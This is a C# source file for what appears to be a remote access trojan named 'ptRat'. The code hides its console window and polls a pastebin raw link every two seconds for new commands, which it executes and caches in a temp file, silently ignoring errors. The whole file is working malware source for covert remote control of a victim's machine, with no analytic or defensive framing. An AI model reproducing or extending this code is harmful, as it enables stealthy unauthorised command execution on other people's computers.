using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;

namespace ptRat.Lib
{
    internal class Main
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static string Data = "";
        static string Server = "PASTEBIN_RAW_LINK";
        static string TempPath = Path.GetTempPath();

        public Main()
        {
            var Handle = GetConsoleWindow();
            ShowWindow(Handle, 0);

            if (File.Exists(TempPath + "\\uo.bak"))
                Data = File.ReadAllText(TempPath + "\\uo.bak");
            for (;;)
            {
                try
                {
                    using (WebClient Client = new WebClient())
                    {
                        Client.Encoding = UTF8Encoding.UTF8;
                        string Req = Client.DownloadString(Server);

                        if (Req != Data)
                        {
                            Data = Req;
                            new RunCommand(Data);
                            File.WriteAllText(TempPath + "\\uo.bak", Data);
                        }
                    }
                } catch { }
                Thread.Sleep(2000);
            }
        }
    }
}
